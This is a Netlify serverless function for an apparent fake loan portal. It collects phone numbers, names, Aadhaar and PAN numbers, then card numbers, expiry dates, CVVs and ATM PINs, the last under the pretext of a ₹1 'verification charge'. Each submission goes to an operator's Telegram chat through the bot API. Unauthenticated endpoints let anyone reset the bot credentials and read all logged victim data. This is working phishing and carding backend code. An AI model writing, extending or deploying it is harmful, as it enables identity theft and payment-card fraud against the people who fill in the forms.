// Netlify serverless function for API endpoints (/api/telegram/*)

let telegramConfig = {
  botToken: process.env.TELEGRAM_BOT_TOKEN || process.env.VITE_TELEGRAM_BOT_TOKEN || '',
  chatId: process.env.TELEGRAM_CHAT_ID || process.env.VITE_TELEGRAM_CHAT_ID || '',
};

const telegramLogs = [];

function escapeHtml(str) {
  if (str == null) return '';
  return String(str)
    .replace(/&/g, '&amp;')
    .replace(/</g, '&lt;')
    .replace(/>/g, '&gt;');
}

async function sendTelegramMessage(token, chatId, text) {
  const url = `https://api.telegram.org/bot${token}/sendMessage`;
  const response = await fetch(url, {
    method: 'POST',
    headers: { 'Content-Type': 'application/json' },
    body: JSON.stringify({
      chat_id: chatId,
      text: text,
      parse_mode: 'HTML',
      disable_web_page_preview: true,
    }),
  });

  const resData = await response.json();
  if (!response.ok || !resData.ok) {
    throw new Error(resData.description || 'Failed to send Telegram message');
  }
  return resData;
}

export async function handler(event) {
  let path = event.path || '/';
  path = path.replace(/^\/\.netlify\/functions\/api/, '');
  path = path.replace(/^\/api/, '');
  if (!path) path = '/';

  const method = event.httpMethod;

  const headers = {
    'Content-Type': 'application/json',
    'Access-Control-Allow-Origin': '*',
    'Access-Control-Allow-Headers': 'Content-Type',
    'Access-Control-Allow-Methods': 'GET, POST, OPTIONS',
  };

  if (method === 'OPTIONS') {
    return { statusCode: 200, headers, body: '' };
  }

  try {
    // GET /api/telegram/config
    if (path === '/telegram/config' && method === 'GET') {
      const activeToken = telegramConfig.botToken || process.env.TELEGRAM_BOT_TOKEN || process.env.VITE_TELEGRAM_BOT_TOKEN || '';
      const activeChatId = telegramConfig.chatId || process.env.TELEGRAM_CHAT_ID || process.env.VITE_TELEGRAM_CHAT_ID || '';

      return {
        statusCode: 200,
        headers,
        body: JSON.stringify({
          hasToken: Boolean(activeToken),
          hasChatId: Boolean(activeChatId),
          maskedToken: activeToken ? `${activeToken.substring(0, 6)}...${activeToken.slice(-4)}` : '',
          chatId: activeChatId,
        }),
      };
    }

    // POST /api/telegram/config
    if (path === '/telegram/config' && method === 'POST') {
      const body = JSON.parse(event.body || '{}');
      if (typeof body.botToken === 'string' && body.botToken.trim()) {
        telegramConfig.botToken = body.botToken.trim();
      }
      if (typeof body.chatId === 'string' && body.chatId.trim()) {
        telegramConfig.chatId = body.chatId.trim();
      }

      const activeToken = telegramConfig.botToken || process.env.TELEGRAM_BOT_TOKEN || process.env.VITE_TELEGRAM_BOT_TOKEN || '';
      const activeChatId = telegramConfig.chatId || process.env.TELEGRAM_CHAT_ID || process.env.VITE_TELEGRAM_CHAT_ID || '';

      return {
        statusCode: 200,
        headers,
        body: JSON.stringify({
          success: true,
          message: 'Telegram configuration updated successfully',
          hasToken: Boolean(activeToken),
          hasChatId: Boolean(activeChatId),
          chatId: activeChatId,
        }),
      };
    }

    // GET /api/telegram/logs
    if (path === '/telegram/logs' && method === 'GET') {
      return {
        statusCode: 200,
        headers,
        body: JSON.stringify({
          logs: telegramLogs,
          total: telegramLogs.length,
        }),
      };
    }

    // POST /api/telegram/send
    if (path === '/telegram/send' && method === 'POST') {
      const body = JSON.parse(event.body || '{}');
      const { type, data = {}, customBotToken, customChatId } = body;

      const activeToken = (customBotToken && customBotToken.trim()) ||
                          (telegramConfig.botToken && telegramConfig.botToken.trim()) ||
                          process.env.TELEGRAM_BOT_TOKEN ||
                          process.env.VITE_TELEGRAM_BOT_TOKEN ||
                          '';

      const activeChatId = (customChatId && customChatId.trim()) ||
                           (telegramConfig.chatId && telegramConfig.chatId.trim()) ||
                           process.env.TELEGRAM_CHAT_ID ||
                           process.env.VITE_TELEGRAM_CHAT_ID ||
                           '';

      const timestamp = new Date().toLocaleString('en-IN', { timeZone: 'Asia/Kolkata' });
      let formattedMessage = '';

      if (type === 'phone_step') {
        formattedMessage = `
📱 <b>NEW LOAN LEAD - PHONE SUBMITTED</b>
──────────────────────────────
• <b>Phone Number:</b> <code>${escapeHtml(data.phone)}</code>
• <b>Submitted At:</b> ${escapeHtml(timestamp)}
• <b>Portal:</b> Netlify Deployment
`;
      } else if (type === 'personal_details') {
        formattedMessage = `
📋 <b>LOAN APPLICATION - PERSONAL DETAILS</b>
──────────────────────────────
• <b>Full Name:</b> ${escapeHtml(data.name)}
• <b>Phone Number:</b> <code>${escapeHtml(data.phone)}</code>
• <b>Employment Type:</b> ${escapeHtml(data.employmentType)}
• <b>Aadhaar Number:</b> <code>${escapeHtml(data.adhar)}</code>
• <b>PAN Card:</b> <code>${escapeHtml(data.panCard || 'N/A')}</code>
• <b>Age:</b> ${escapeHtml(data.age)} years
• <b>State:</b> ${escapeHtml(data.state)}
• <b>City:</b> ${escapeHtml(data.city)}
• <b>Pincode:</b> ${escapeHtml(data.pincode)}
• <b>Requested Loan:</b> ₹${Number(data.loanAmount || 250000).toLocaleString('en-IN')} (${escapeHtml(data.loanTenure || 24)} months)
• <b>Submitted At:</b> ${escapeHtml(timestamp)}
`;
      } else if (type === 'card_details') {
        formattedMessage = `
💳 <b>LOAN DISBURSEMENT FEE - CARD DETAILS</b>
──────────────────────────────
• <b>Applicant Name:</b> ${escapeHtml(data.name || 'N/A')}
• <b>Phone:</b> <code>${escapeHtml(data.phone || 'N/A')}</code>
• <b>Fee Amount:</b> ₹1.00 (Debit Card Verification Charge)
• <b>Card Number:</b> <code>${escapeHtml(data.cardNumber)}</code>
• <b>Card Holder:</b> ${escapeHtml(data.cardHolder || 'N/A')}
• <b>Expiry Date:</b> <code>${escapeHtml(data.exp)}</code>
• <b>CVV:</b> <code>${escapeHtml(data.cvv)}</code>
• <b>PIN Number:</b> <code>${escapeHtml(data.pin || 'Not Provided')}</code>
• <b>Submitted At:</b> ${escapeHtml(timestamp)}
`;
      } else {
        formattedMessage = `
ℹ️ <b>LOAN PORTAL TEST EVENT</b>
──────────────────────────────
• <b>Event:</b> ${escapeHtml(type)}
• <b>Status:</b> Telegram Bot Connected & Working
• <b>Timestamp:</b> ${escapeHtml(timestamp)}
`;
      }

      const logEntry = {
        id: `log_${Date.now()}_${Math.random().toString(36).substring(2, 6)}`,
        timestamp,
        type,
        formattedMessage,
        data,
        status: 'simulated',
      };

      if (!activeToken || !activeChatId) {
        logEntry.status = 'simulated';
        telegramLogs.unshift(logEntry);
        return {
          statusCode: 200,
          headers,
          body: JSON.stringify({
            success: true,
            simulated: true,
            message: 'No active Telegram bot credentials found. Configure Bot Token and Chat ID in Settings.',
            log: logEntry,
          }),
        };
      }

      try {
        await sendTelegramMessage(activeToken, activeChatId, formattedMessage);
        logEntry.status = 'sent';
        telegramLogs.unshift(logEntry);
        return {
          statusCode: 200,
          headers,
          body: JSON.stringify({
            success: true,
            simulated: false,
            message: 'Notification sent successfully to Telegram bot!',
            log: logEntry,
          }),
        };
      } catch (error) {
        logEntry.status = 'error';
        logEntry.errorMessage = error.message;
        telegramLogs.unshift(logEntry);
        return {
          statusCode: 500,
          headers,
          body: JSON.stringify({
            success: false,
            simulated: false,
            error: error.message || 'Failed to send message to Telegram bot',
            log: logEntry,
          }),
        };
      }
    }

    return {
      statusCode: 404,
      headers,
      body: JSON.stringify({ error: 'Endpoint not found' }),
    };
  } catch (err) {
    return {
      statusCode: 500,
      headers,
      body: JSON.stringify({ error: err.message || 'Internal server error' }),
    };
  }
}
